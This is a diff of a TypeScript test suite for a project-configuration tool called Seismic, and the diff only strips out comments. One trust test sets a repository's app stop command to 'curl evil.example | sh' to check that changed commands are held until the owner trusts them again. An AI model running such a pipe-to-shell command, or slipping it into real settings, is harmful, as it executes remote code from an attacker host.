@@ -20,7 +20,7 @@ let api: string;
 let file: string;
 let restarts: number;
 let applied: number;
-/** The ids of the configurations the running projects took over. */
+
 let taken: (string | null)[][];
 
 function repo(name: string) {
@@ -35,7 +35,7 @@ const config = (source: 'file' | 'args', started: ProjectConfig[], running: stri
     store,
     running: () => running,
     server: { port: 4417, home: dir, permissionMode: 'auto' },
-    // not the machine's lock: a demo another agent renders meanwhile would hold up the sample
+    
     ttsLock: join(dir, 'tts.lock'),
     restart: () => void restarts++,
     apply: (_, ids) => void taken.push(ids),
@@ -120,7 +120,7 @@ describe("Seismic's configuration", async () => {
     const board = new Board(store, { id: 'web', name: 'web', repos: [{ id: 'web', name: 'web', path: web, branch: 'main' }] }, () => ({ docs: [], dirs: [] }));
     const made = [1, 2, 3].map((i) => gitRepo(join(dir, 'workspaces', 'web', String(i))));
     const own = gitRepo(join(dir, 'own'));
-    // a card's worktree is no clone
+    
     const tree = join(dir, 'workspaces', 'web', '12345678');
     mkdirSync(tree, { recursive: true });
     writeFileSync(join(tree, '.git'), 'gitdir: elsewhere\n');
@@ -134,7 +134,7 @@ describe("Seismic's configuration", async () => {
       { path: made[2]!, made: 3, card: 'Login' },
       { path: '/far/2', host: 'gpu', made: 2 },
     ]);
-    // in worktrees, every clone leaves
+    
     expect((await leaving({ settings: { workstations: 'worktrees' } }))?.map((x) => x.path)).toEqual([own, ...made, '/far/1', '/far/2']);
   });
 
@@ -142,14 +142,14 @@ describe("Seismic's configuration", async () => {
     const c = config('file', []);
     const broken = { repos: [{ path: join(dir, 'nowhere-at-all') }] };
     const web2 = gitRepo(join(dir, 'web2'));
-    // the broken project is new: it blocks the save
+    
     await expect(c.save([broken, { repos: [{ path: web2 }] }])).rejects.toThrow();
-    // once saved as it is (the file may hold it from an earlier version), it no longer blocks the others
+    
     mkdirSync(dirname(file), { recursive: true });
     writeFileSync(file, JSON.stringify([broken]));
     await c.save([broken, { repos: [{ path: web2 }] }]);
     expect(JSON.parse(readFileSync(file, 'utf8'))).toHaveLength(2);
-    // changing the broken one blocks again
+    
     await expect(c.save([{ ...broken, planBaselines: false }, { repos: [{ path: web2 }] }])).rejects.toThrow();
   });
 
@@ -174,12 +174,12 @@ describe("Seismic's configuration", async () => {
     const checked = await c.check([folder]);
     expect(checked.problems).toEqual([{ code: 'folderHarness', project: 0, repo: 0, detail: "Antigravity works only in a Git repository: set up git in the folder, or let the project's workers run in Claude Code" }]);
     expect(checked.problems.every(blocksSaving)).toBe(true);
-    // the project's own Claude Code over Configuration's: the folder is fine
+    
     expect((await c.check([{ ...folder, agents: { worker: { harness: 'claude' } } }])).problems).toEqual([]);
-    // and the other way round
+    
     saveAgents(dir, { worker: { harness: 'claude' } });
     expect((await c.check([{ ...folder, agents: { worker: { harness: 'codex' } } }])).problems.map((p) => p.code)).toEqual(['folderHarness']);
-    // a git repository has no such problem
+    
     expect((await c.check([{ repos: [{ path: repo('web') }], agents: { worker: { harness: 'codex' } } }])).problems).toEqual([]);
   });
 
@@ -195,10 +195,10 @@ describe("Seismic's configuration", async () => {
       { code: 'notClone', project: 1, repo: 0 },
       { code: 'noRepo', project: 2, repo: undefined },
     ]);
-    // the id follows the name, unless it is kept
+    
     expect((await c.check([{ name: 'Neuer Name', id: 'web', repos: [{ path: web }] }])).resolved[0]).toMatchObject({ id: 'web', name: 'Neuer Name' });
     expect((await c.check([{ name: 'Web', repos: [{ path: web }] }, { name: 'web', repos: [{ path: api }] }])).problems).toMatchObject([{ code: 'sameId', project: 1 }]);
-    // a repository once per project, by whatever path it is named
+    
     expect((await c.check([{ name: 'Web', repos: [{ path: web }, { path: api }, { path: `${web}/` }] }])).problems).toMatchObject([{ code: 'sameRepo', project: 0, repo: 2 }]);
     expect((await c.check([])).problems.map((p) => p.code)).toEqual(['noProject']);
     expect((await c.check([{ repos: [{ path: web, color: 'red' }] }])).problems.map((p) => p.code)).toEqual(['invalid']);
@@ -226,7 +226,7 @@ describe("Seismic's configuration", async () => {
   });
 
   test("a repository whose path is still empty reads nothing, the server's working directory least of all", async () => {
-    // the server runs in a repository with settings and commands of its own
+    
     const own = gitRepo(join(dir, 'server'), { '.seismic/settings.json': JSON.stringify({ checks: ['make check'] }) });
     const cwd = process.cwd();
     process.chdir(own);
@@ -249,7 +249,7 @@ describe("Seismic's configuration", async () => {
     mkdirSync(join(dir, 'home'));
     writeFileSync(file, JSON.stringify([{ name: 'Web', repos: [{ path: web, share: 'share.ts', clones: 2 }] }]));
     expect(readConfigFile(file)).toEqual([{ name: 'Web', repos: [{ path: web, clones: 2 }] }]);
-    // the dialog sends none
+    
     expect((await config('file', []).check([{ repos: [{ path: web, share: 'share.ts' }] }])).problems.map((p) => p.code)).toEqual(['invalid']);
   });
 
@@ -260,10 +260,10 @@ describe("Seismic's configuration", async () => {
     const check = (repos: object[]) => c.check([{ repos }]);
     expect(await check([{ path: web, hosts: [host, { name: ' ', ssh: '', root: '', clones: 1 }] }])).toMatchObject({ problems: [], projects: [{ repos: [{ path: web, hosts: [host] }] }] });
     expect((await check([{ path: web, hosts: [{ ...host, root: ' ' }] }])).projects[0]!.repos[0]!.hosts).toEqual([{ ...host, root: '~/seismic' }]);
-    // slots here and there, 0 included (no new cards there); left out, as many as there are clones
+    
     expect((await check([{ path: web, slots: 0, hosts: [{ ...host, slots: 1 }] }])).projects[0]!.repos[0]).toMatchObject({ slots: 0, hosts: [{ ...host, slots: 1 }] });
     expect((await check([{ path: web, hosts: [host] }])).projects[0]!.repos[0]).not.toHaveProperty('slots');
-    // landing on the main of this checkout, or no remote: the host could not clone it
+    
     expect((await check([{ path: web, settings: { land: 'main' }, hosts: [host] }])).problems.map((p) => p.code)).toEqual(['hostRepo']);
     expect((await check([{ path: api, hosts: [host] }])).problems.map((p) => p.code)).toEqual(['hostRepo']);
     Bun.spawnSync(['git', '-C', api, 'remote', 'add', 'origin', 'https://github.com/acme/api.git']);
@@ -278,7 +278,7 @@ describe("Seismic's configuration", async () => {
     const checked = await c.check([{ repos: [{ path: own }], demoSite: { url: 'https://demos.example.dev/', path: '/billing/' } }]);
     expect(checked.problems.map((p) => [p.code, p.detail])).toEqual([['repoSettings', '.seismic/settings.json, demo.site: no longer read; a project chooses its demo site in its settings']]);
     expect(checked.projects[0]!.demoSite).toEqual({ url: 'https://demos.example.dev', path: 'billing' });
-    // a path that is not one
+    
     expect((await c.check([{ repos: [{ path: web }], demoSite: { url: 'https://demos.example.dev', path: 'Bil ling' } }])).problems.map((p) => p.code)).toEqual(['invalid']);
   });
 
@@ -299,7 +299,7 @@ describe("Seismic's configuration", async () => {
     expect((await c.check([{ name: 'Produkt', repos: [{ path: api }] }])).problems.map((p) => p.code)).toEqual(['homeMissing']);
     const moved = (await c.check([{ name: 'Produkt', repos: [{ path: api }, { path: web }] }]));
     expect(moved.problems).toEqual([]);
-    // listed in the order given, though the home one runs first
+    
     expect(moved.resolved[0]!.repos.map((r) => r.id)).toEqual(['api', 'web']);
   });
 
@@ -314,7 +314,7 @@ describe("Seismic's configuration", async () => {
     expect(readConfigFile(file)).toEqual([{ repos: [{ path: web }, { path: api, clones: 2 }] }]);
     expect(restarts).toBe(1);
     expect(c.view().restarting).toBe(true);
-    // saved again before the restart: the file has the latest, and the restart is already on its way
+    
     (await c.save([{ repos: [{ path: api }] }]));
     expect(restarts).toBe(1);
   });
@@ -322,23 +322,23 @@ describe("Seismic's configuration", async () => {
   test("a renamed project keeps its old names, which no other project may take until they are deleted there", async () => {
     const c = config('file', [{ name: 'Store', repos: [{ path: web }] }], ['store']);
     await c.save([{ name: 'Store', repos: [{ path: web }] }]);
-    // the dialog keeps the id when it renames
+    
     await c.save([{ name: 'Market', id: 'store', repos: [{ path: web }] }]);
     expect(c.current()[0]).toMatchObject({ name: 'Market', id: 'store', oldNames: ['Store'] });
     await c.save([{ ...c.current()[0]!, name: 'Bazaar' }]);
     expect(c.current()[0]!.oldNames).toEqual(['Store', 'Market']);
-    // a new project by an old name, however written, or by the name now, is refused
+    
     const taken = await c.check([...c.current(), { name: 'market', repos: [{ path: api }] }]);
     expect(taken.problems).toMatchObject([{ code: 'oldNameTaken', project: 1, of: 'Bazaar', ofProject: 0 }]);
     expect(taken.problems.filter(blocksSaving)).toHaveLength(1);
     expect((await c.check([...c.current(), { name: 'Bazaar!', id: 'other', repos: [{ path: api }] }])).problems).toMatchObject([{ code: 'nameTaken', project: 1, of: 'Bazaar' }]);
-    // renamed back to an old name: its name again, no longer an old one
+    
     await c.save([{ ...c.current()[0]!, name: 'Store' }]);
     expect(c.current()[0]!.oldNames).toEqual(['Market', 'Bazaar']);
-    // deleted there, an old name is free for a new project
+    
     await c.save([{ ...c.current()[0]!, oldNames: ['Bazaar'] }, { name: 'Market', repos: [{ path: api }] }]);
     expect(c.current().map((x) => [x.name, x.oldNames])).toEqual([['Store', ['Bazaar']], ['Market', undefined]]);
-    // a name freed by a rename and taken by another project in the same save is refused
+    
     await expect(c.save([{ ...c.current()[0]!, name: 'Shop' }, { name: 'Store', id: 'store2', repos: [{ path: api }] }])).rejects.toThrow('old name');
   });
 
@@ -359,7 +359,7 @@ describe("Seismic's configuration", async () => {
     mkdirSync(join(dir, 'home'));
     writeFileSync(file, JSON.stringify([{ repos: [{ path: web, settings: { setup: 'x', demo: { site: { ...site, language: 'en' } } } }] }]));
     expect(readConfigFile(file)).toEqual([{ repos: [{ path: web, settings: { setup: 'x' } }] }]);
-    // so does a draft the dialog kept from before
+    
     expect((await config('file', []).check([{ repos: [{ path: web, settings: { demo: { site } } }] }])).problems.map((p) => p.code)).not.toContain('invalid');
   });
 
@@ -371,11 +371,11 @@ describe("Seismic's configuration", async () => {
     expect(readConfigFile(file)).toEqual([{ repos: [{ path: web, settings: { land: 'main', checks: ['bun test'], setup: '' } }] }]);
     expect(c.repoSettings(web)).toEqual({ land: 'main', checks: ['bun test'], setup: '' });
     expect(c.repoSettings(api)).toBeUndefined();
-    // set back to what comes from elsewhere: nothing set
+    
     (await c.save([{ repos: [{ path: web, settings: {} }] }]));
     expect(readConfigFile(file)).toEqual([{ repos: [{ path: web }] }]);
     expect(c.repoSettings(web)).toBeUndefined();
-    // the language of the repository's demos, beside its site or alone
+    
     (await c.save([{ repos: [{ path: web, settings: { demo: { language: 'en' } } }] }]));
     expect(c.repoSettings(web)).toEqual({ demo: { language: 'en' } });
     expect((await c.save([{ repos: [{ path: web, settings: { workstations: 'clones' } }] }]))).toEqual({ restarting: false, applied: true });
@@ -418,7 +418,7 @@ describe("Seismic's configuration", async () => {
       workstations: { value: 'worktrees', source: 'default' },
       app: { run: { value: '', source: 'default' } },
     });
-    // this machine's own come on top, in the draft: the values beside them stay what they would be without
+    
     const own = gitRepo(join(dir, 'own'), { '.seismic/settings.json': '{ "land": "main", "checks": ["bun test"], "app": { "run": "bun dev" } }\n' });
     const ownValues = (await c.check([{ repos: [{ path: own, settings: { land: 'pr' } }] }])).resolved[0]!.repos[0]!.values;
     expect(ownValues).toMatchObject({ land: { value: 'main', source: 'repository' }, checks: { source: 'repository' }, planDocs: { source: 'default' }, app: { run: { source: 'repository' } } });
@@ -451,7 +451,7 @@ describe("Seismic's configuration", async () => {
     expect(checked.resolved[0]!.repos[0]!.values.app).toMatchObject({ run: { source: 'repository' }, stop: { value: app.stop, source: 'repository', held: true } });
     expect(checked.resolved[0]!.repos[0]!.values.app.run.held).toBeUndefined();
 
-    // what the dialog showed is trusted; commands that changed since are not
+    
     await expect(async () => c.trust({ path: own, seen: { app: { stop: 'other' } }, held: ['app'] })).toThrow(expect.objectContaining({ code: 'trustChanged' }));
     c.trust({ path: own, seen: trust.now, held: trust.held });
     expect(applied).toBe(1);
@@ -459,14 +459,14 @@ describe("Seismic's configuration", async () => {
     expect(checked.problems).toEqual([]);
     expect(checked.resolved[0]!.repos[0]!.trust).toBeUndefined();
 
-    // changed on the default branch: held again, with what was trusted before
+    
     writeFileSync(join(own, '.seismic/settings.json'), JSON.stringify({ app: { ...app, stop: 'curl evil.example | sh' } }));
     git(own, 'commit', '--quiet', '-am', 'stop');
     checked = await c.checkSaved();
     expect(checked.resolved[0]!.repos[0]!.trust).toEqual({ held: ['app'], now: { app: { stop: 'curl evil.example | sh' }, claude: trust.now.claude }, before: trust.now });
-    // this machine's stop and keep stand in its place: nothing waits
+    
     expect((await c.check([{ repos: [{ path: own, settings: { app: { stop: 'make stop', keep: 'false' } } }] }])).problems).toEqual([]);
-    // trusted with them, what they stand in for was not shown, so it stays untrusted
+    
     writeFileSync(join(own, '.mcp.json'), '{"mcpServers":{"x":{}}}');
     git(own, 'commit', '--quiet', '-am', 'mcp');
     const mine = { app: { stop: 'make stop', keep: 'false' } };
@@ -505,12 +505,12 @@ describe("Seismic's configuration", async () => {
     writeFileSync(file, JSON.stringify([{ repos: [{ path: web, settings }] }]));
     const c = config('file', [{ repos: [{ path: web, settings }] }]);
     expect((await c.checkSaved()).resolved[0]!.repos[0]!.shareTo).toBe('main');
-    // the checkout's own change to the file is not overwritten
+    
     mkdirSync(join(web, '.seismic'));
     writeFileSync(join(web, '.seismic/settings.json'), '{}\n');
     await expect(c.shareSettings({ path: web })).rejects.toMatchObject({ code: 'settingsDirty' });
     rmSync(join(web, '.seismic'), { recursive: true });
-    // a change staged for something else stays staged, and out of the commit
+    
     writeFileSync(join(web, 'README.md'), 'staged\n');
     git(web, 'add', 'README.md');
 
@@ -519,7 +519,7 @@ describe("Seismic's configuration", async () => {
     expect(JSON.parse(git(web, 'show', 'main:.seismic/settings.json'))).toEqual({ checks: ['bun test'], app: { run: 'bun dev' } });
     expect(git(web, 'show', '--name-only', '--format=%s', 'main').trim()).toBe('Seismic settings for everyone: checks, app\n\n.seismic/settings.json');
     expect(git(web, 'status', '--porcelain').trim()).toBe('M  README.md');
-    // the main branch stays this machine's; the rest come from the repository now
+    
     expect(readConfigFile(file)).toEqual([{ repos: [{ path: web, settings: { branch: 'main' } }] }]);
     expect((await c.checkSaved()).resolved[0]!.repos[0]!.values).toMatchObject({ checks: { value: ['bun test'], source: 'repository' }, app: { run: { source: 'repository' } } });
     expect([applied, restarts]).toEqual([1, 0]);
@@ -551,7 +551,7 @@ describe("Seismic's configuration", async () => {
     expect(JSON.parse(git(origin, 'show', `${opened[0]!.head}:.seismic/settings.json`))).toEqual(settings);
     expect(git(web, 'rev-parse', 'main').trim()).toBe(before);
     expect(readConfigFile(file)).toEqual([{ repos: [{ path: web, settings }] }]);
-    // merged: the values the file now holds go from this machine's
+    
     c.takenOver(web, undefined, { land: 'pr', checks: ['bun test'] });
     expect(readConfigFile(file)).toEqual([{ repos: [{ path: web }] }]);
     expect(applied).toBe(0);
@@ -576,7 +576,7 @@ describe("Seismic's configuration", async () => {
     expect(done).toEqual({ committed: git(origin, 'rev-parse', 'main').trim(), branch: 'main', file: '.seismic/settings.json' });
     expect(JSON.parse(git(origin, 'show', 'main:.seismic/settings.json'))).toEqual(settings);
     expect(readConfigFile(file)).toEqual([{ repos: [{ path: web }] }]);
-    // read from origin's main, which has more than the local one
+    
     expect((await c.checkSaved()).resolved[0]!.repos[0]!.values.checks).toEqual({ value: ['bun test'], source: 'repository' });
     expect(applied).toBe(1);
   });
@@ -589,7 +589,7 @@ describe("Seismic's configuration", async () => {
     expect(readConfigFile(file)).toEqual([{ repos: [{ path: web, settings: { checks: ['bun test'], setup: 'bun install', app: { run: 'bun dev --port 4000' } } }] }]);
     expect((await c.takeSetting(web, 'checks', ['bun run typecheck'], 'machine'))).toBeNull();
     expect(readConfigFile(file)[0]!.repos[0]!.settings!.checks).toEqual(['bun run typecheck']);
-    // nothing went into the repository
+    
     expect(existsSync(join(web, '.seismic/settings.json'))).toBe(false);
     expect(taken).toHaveLength(2);
   });
@@ -602,7 +602,7 @@ describe("Seismic's configuration", async () => {
     expect(done).toMatchObject({ branch: 'main', committed: git(web, 'rev-parse', 'main').trim() });
     expect(JSON.parse(git(web, 'show', 'main:.seismic/settings.json'))).toEqual({ app: { run: 'bun dev --port 4000' } });
     expect(git(web, 'log', '-1', '--format=%s', 'main').trim()).toBe('Seismic settings for everyone: app');
-    // this machine's other value for it went, so the repository's applies here; its checks stay its own
+    
     expect(readConfigFile(file)).toEqual([{ repos: [{ path: web, settings: { checks: ['bun test'] } }] }]);
     expect((await c.checkSaved()).resolved[0]!.repos[0]!.values.app.run).toEqual({ value: 'bun dev --port 4000', source: 'repository' });
     expect(applied).toBe(1);
@@ -659,7 +659,7 @@ describe("Seismic's configuration", async () => {
     bun.spawnSync = (cmd, ...rest) => (calls.push(`waits: ${cmd.join(' ')}`), (spawnSync as (...a: unknown[]) => unknown)(cmd, ...rest));
     let checked;
     try {
-      // web is a repository of two projects and a workstation of its own, beside a clone of it
+      
       checked = await c.check([{ repos: [{ path: web, workstations: [web, clone] }] }, { name: 'Zwei', repos: [{ path: web }, { path: api, settings: { branch: 'main' } }] }]);
     } finally {
       Object.assign(Bun, { spawn, spawnSync });
@@ -706,7 +706,7 @@ describe('the configuration over HTTP', () => {
     const refused = await call('PUT', '/api/v1/configuration', [{ repos: [{ path: join(dir, 'nowhere') }] }]);
     expect(refused).toMatchObject({ status: 400, body: { code: 'config' } });
 
-    // the answer has what came of it and the configuration as it then reads: from the command line, it runs on as it started until the restart
+    
     expect((await call('PUT', '/api/v1/configuration', [{ repos: [{ path: web }, { path: api }] }])).body).toMatchObject({ saved: { restarting: true }, configuration: { restarting: true, running: ['web'] } });
     expect(readConfigFile(file)).toEqual([{ repos: [{ path: web }, { path: api }] }]);
   });
@@ -727,14 +727,14 @@ describe('the configuration over HTTP', () => {
     writeFileSync(join(dir, 'settings.json'), JSON.stringify({ later: 1 }));
     expect((await call('PUT', '/api/v1/settings/language', { language: 'en' })).body.setting).toMatchObject({ chosen: 'en', language: 'en' });
     expect(JSON.parse(readFileSync(join(dir, 'settings.json'), 'utf8'))).toEqual({ later: 1, language: 'en' });
-    // the server reads it whenever it needs it
+    
     expect(ownerLanguage(dir)).toBe('en');
     expect((await call('PUT', '/api/v1/settings/language', { language: null })).body.setting).toMatchObject({ chosen: null, language: before.system });
     expect(JSON.parse(readFileSync(join(dir, 'settings.json'), 'utf8'))).toEqual({ later: 1 });
   });
 
   test('reads and saves the demo settings in its home, without a restart', async () => {
-    // without a narration language of their own, demos speak the owner's
+    
     writeFileSync(join(dir, 'settings.json'), JSON.stringify({ language: 'en' }));
     const before = (await call('GET', '/api/v1/settings/demo')).body.setting as unknown as DemoSettingsView;
     expect(before).toMatchObject({ file: join(dir, 'demo.json'), settings: { language: 'en', voice: 'piper' }, check: { person: 'third', problems: [] } });
@@ -743,13 +743,13 @@ describe('the configuration over HTTP', () => {
     const saved = await call('PUT', '/api/v1/settings/demo', { language: 'en', voice: 'command', command: ' speak ', ownVoice: true });
     expect(saved.body.setting).toMatchObject({ settings: { language: 'en', voice: 'command', command: 'speak', ownVoice: true }, check: { person: 'first', problems: [] } });
     expect(JSON.parse(readFileSync(join(dir, 'demo.json'), 'utf8'))).toEqual({ language: 'en', voice: 'command', ownVoice: true, command: 'speak' });
-    // a voice being chosen is checked before it is saved
+    
     const draft = await call('POST', '/api/demo-settings/check', { language: 'en', voice: 'qwen3', references: { en: join(dir, 'me.wav') } });
     expect(draft.body).toMatchObject({ person: 'third', problems: [], clips: { en: 'referenceMissing' }, install: { installed: false } });
-    // a draft the dialog kept from before names one clip: that of its language
+    
     const old = await call('POST', '/api/demo-settings/check', { language: 'en', voice: 'qwen3', reference: join(dir, 'me.wav') });
     expect(old.body).toMatchObject({ clips: { en: 'referenceMissing' } });
-    // the directory demos go into: the one that applies, and a relative one, which would land wherever the agent works
+    
     expect(before.check).toMatchObject({ directory: join(homedir(), 'demos') });
     const demos = join(dir, 'demos');
     expect((await call('PUT', '/api/v1/settings/demo', { language: 'en', voice: 'piper', directory: demos })).body.setting).toMatchObject({ settings: { directory: demos }, check: { directory: demos } });
@@ -772,7 +772,7 @@ describe('the configuration over HTTP', () => {
     expect(refused).toMatchObject({ status: 400, body: { code: 'voiceSample' } });
     expect(String(refused.body.error)).toContain('broken');
 
-    // an own endpoint gets the text and the language as JSON, the key as a bearer token
+    
     let asked: { auth: string | null; body: unknown } | undefined;
     const endpoint = Bun.serve({
       port: 0,
@@ -819,11 +819,11 @@ describe('the configuration over HTTP', () => {
       b.onNotice((n) => notices.push(n.text));
 
       expect((await post(`/api/c/web/setting-proposals/${run}/take`, { where: 'nowhere' })).status).toBe(400);
-      // on this machine, in the owner's words
+      
       expect((await post(`/api/c/web/setting-proposals/${run}/take`, { where: 'machine', value: ' bun dev --port 4100 ' })).status).toBe(200);
       expect(c.repoSettings(web)).toEqual({ checks: ['bun test'], app: { run: 'bun dev --port 4100' } });
       expect(notices.at(-1)).toBe('“How to run the app” for web now applies on this machine.');
-      // for everyone: committed on main, that value alone
+      
       expect((await post(`/api/c/web/setting-proposals/${checks}/take`, { where: 'repository' })).body).toMatchObject({ branch: 'main' });
       expect(JSON.parse(git(web, 'show', 'main:.seismic/settings.json'))).toEqual({ checks: ['bun test', 'bun run typecheck'] });
       expect(c.repoSettings(web)).toEqual({ app: { run: 'bun dev --port 4100' } });
@@ -862,7 +862,7 @@ describe('a change the Koordinator makes', () => {
       const heard = project.commander.hear('Nimm api auf die Leinwand web.', {});
       await until(() => runtime.sessions.some((s) => s.spec.tools.some((t) => t.name === 'configure')));
       const k = runtime.sessions.find((s) => s.spec.tools.some((t) => t.name === 'configure'))!;
-      // the configuration as the Koordinator reads it, with api added, through the tool's schema as its SDK hands the arguments on
+      
       const { projects } = JSON.parse(await k.call('config', {})) as ConfigView;
       const tool = k.spec.tools.find((t) => t.name === 'configure')!;
       const args = z.object(tool.schema).parse({ projects: [{ repos: [...projects[0]!.repos, { path: api }] }, projects[1]], confirm: 'api kommt auf die Leinwand web.' });
@@ -903,7 +903,7 @@ describe('the demo settings', () => {
     writeFileSync(join(dir, 'me.txt'), 'Hello.');
     expect(clipProblems(s)).toEqual({});
     expect(clipProblems({ ...s, references: { en: join(dir, 'me-en.wav') } })).toEqual({ en: 'referenceMissing' });
-    // another voice clones nothing
+    
     expect(clipProblems({ ...s, voice: 'piper' })).toEqual({});
   });
 });
@@ -929,7 +929,7 @@ function wav(seconds: number, rate = 16000) {
 
 describe('Project defaults', () => {
   test('every project setting has a value in Project defaults', () => {
-    // what a project holds beside its identity (names, id, icon) and repositories is a project setting; a new one needs its default
+    
     const settings = Object.keys(configShape.element.shape).filter((k) => !['name', 'id', 'oldNames', 'icon', 'repos'].includes(k));
     expect(settings.length).toBeGreaterThan(0);
     const defaults = projectDefaults(dir) as Record<string, unknown>;
@@ -944,15 +944,15 @@ describe('Project defaults', () => {
     expect(projectDefaultsView(dir)).toEqual({ file: join(dir, 'settings.json'), defaults: { planBaselines: true, archive: 'manual', rightClick: 'groups', suggest: { category: true, complexity: true, priority: true }, suggestLabels: true, suggestCards: true, suggestMerges: true, agents: {}, codeReviews: { on: false, mode: 'auto' }, demoSite: null } });
     saveProjectDefaults(dir, { suggest: { complexity: false } });
     expect(projectDefaults(dir)).toEqual({ planBaselines: true, archive: 'manual', rightClick: 'groups', suggest: { category: true, complexity: false, priority: true }, suggestLabels: true, suggestCards: true, suggestMerges: true, agents: {}, codeReviews: { on: false, mode: 'auto' }, demoSite: null });
-    // cards are archived by hand until the owner chooses otherwise
+    
     saveProjectDefaults(dir, { archive: 'landed' });
     expect(projectDefaults(dir).archive).toBe('landed');
     expect(() => saveProjectDefaults(dir, { archive: 'weekly' })).toThrow();
-    // code reviews start off, and once on, with the demo, until the owner chooses otherwise
+    
     saveProjectDefaults(dir, { codeReviews: { on: true, mode: 'manual' } });
     expect(projectDefaults(dir).codeReviews).toEqual({ on: true, mode: 'manual' });
     expect(() => saveProjectDefaults(dir, { codeReviews: { mode: 'sometimes' } })).toThrow();
-    // other settings in the file stay
+    
     expect(ownerLanguage(dir)).toBeDefined();
     expect(() => saveProjectDefaults(dir, { suggest: { colour: true } })).toThrow();
     expect(() => saveProjectDefaults(dir, { theme: 'dark' })).toThrow();
@@ -963,13 +963,13 @@ describe('Project defaults', () => {
     writeFileSync(file, `${JSON.stringify([{ repos: [{ path: web }] }])}\n`);
     const c = config('file', [], ['web']);
     saveProjectDefaults(dir, { suggest: { priority: false } });
-    // a new project beside the existing one, which has no toggles of its own (all on)
+    
     await c.save([{ name: 'Web', repos: [{ path: web }] }, { repos: [{ path: api }] }]);
     expect(readConfigFile(file)).toEqual([
       { name: 'Web', repos: [{ path: web }] },
       { planBaselines: true, archive: 'manual', rightClick: 'groups', suggest: { category: true, complexity: true, priority: false }, suggestLabels: true, suggestCards: true, suggestMerges: true, codeReviews: { on: false, mode: 'auto' }, repos: [{ path: api }] },
     ]);
-    // changing the defaults later leaves both alone, and what a new project sets itself is its own
+    
     saveProjectDefaults(dir, { suggest: { category: false, priority: true } });
     const other = repo('other');
     await c.save([...readConfigFile(file), { suggest: { complexity: false }, repos: [{ path: other }] }]);
@@ -1011,11 +1011,11 @@ describe('The project settings', () => {
     const after = await c.saveRepo('web', { path: api, settings: { checks: ['make', 'make lint'], setup: 'make deps' } });
     expect(readConfigFile(file)).toEqual([{ name: 'Web', repos: [{ path: web, slots: 3 }, { path: api, settings: { checks: ['make', 'make lint'], setup: 'make deps' } }] }]);
     expect(after.project.repos[1]?.settings?.setup).toBe('make deps');
-    // a field left out goes; where its agents work changes with what it is given
+    
     await c.saveRepo('web', { path: web, clones: 2, settings: { workstations: 'clones' } });
     expect(readConfigFile(file)[0]?.repos[0]).toEqual({ path: web, clones: 2, settings: { workstations: 'clones' } });
     await expect(c.saveRepo('web', { path: join(dir, 'elsewhere') })).rejects.toThrow();
-    // the folder mode is the entry's own: one sent along changes nothing
+    
     await c.saveRepo('web', { path: web, git: false, clones: 2, settings: { workstations: 'clones' } });
     expect(readConfigFile(file)[0]?.repos[0]).toEqual({ path: web, clones: 2, settings: { workstations: 'clones' } });
     await expect(c.saveRepo('nowhere', { path: web })).rejects.toThrow();
@@ -1029,10 +1029,10 @@ describe('The project settings', () => {
     writeFileSync(file, `${JSON.stringify([{ name: 'Docs', repos: [{ path: docs, git: false }] }])}\n`);
     const c = config('file', [], ['docs']);
     const v = await c.projectView('docs');
-    // the sheet sends the whole entry as read, its folder mode included
+    
     await c.saveRepo('docs', { ...v.project.repos[0]!, settings: { checks: ['make'] } });
     expect(readConfigFile(file)).toEqual([{ name: 'Docs', repos: [{ path: docs, git: false, settings: { checks: ['make'] } }] }]);
-    // one sent without it stays a folder too
+    
     await c.saveRepo('docs', { path: docs, settings: { setup: 'make deps' } });
     expect(readConfigFile(file)[0]?.repos[0]).toEqual({ path: docs, git: false, settings: { setup: 'make deps' } });
   });
@@ -1062,17 +1062,17 @@ describe('The project settings', () => {
     writeFileSync(file, `${JSON.stringify([{ name: 'Web', repos: [{ path: web }] }, { repos: [{ path: api }] }])}\n`);
     const c = config('file', [], ['web']);
     await c.saveProject('web', { agents: { worker: { model: 'sonnet' }, chores: {} } });
-    // an empty group says nothing and is not saved
+    
     expect(readConfigFile(file)).toEqual([{ name: 'Web', agents: { worker: { model: 'sonnet' } }, repos: [{ path: web }] }, { repos: [{ path: api }] }]);
     await c.saveProject('web', { agents: { worker: { harness: 'codex', codex: { model: 'gpt-6', effort: 'medium' } } } });
     expect(readConfigFile(file)[0]).toMatchObject({ agents: { worker: { harness: 'codex', codex: { model: 'gpt-6', effort: 'medium' } } } });
-    // all groups back to the configuration's: no models of its own left
+    
     await c.saveProject('web', { agents: {} });
     expect(readConfigFile(file)[0]).toEqual({ name: 'Web', repos: [{ path: web }] });
     await expect(c.saveProject('web', { agents: { worker: { model: 'gpt' } } })).rejects.toThrow();
     await expect(c.saveProject('web', { name: 'Other' })).rejects.toThrow();
     await expect(c.saveProject('nowhere', { suggest: { priority: false } })).rejects.toThrow();
-    // changes sent at once all stay
+    
     await Promise.all([c.saveProject('web', { planBaselines: false }), c.saveProject('web', { suggest: { priority: false } })]);
     expect(readConfigFile(file)[0]).toMatchObject({ planBaselines: false, suggest: { priority: false } });
   });
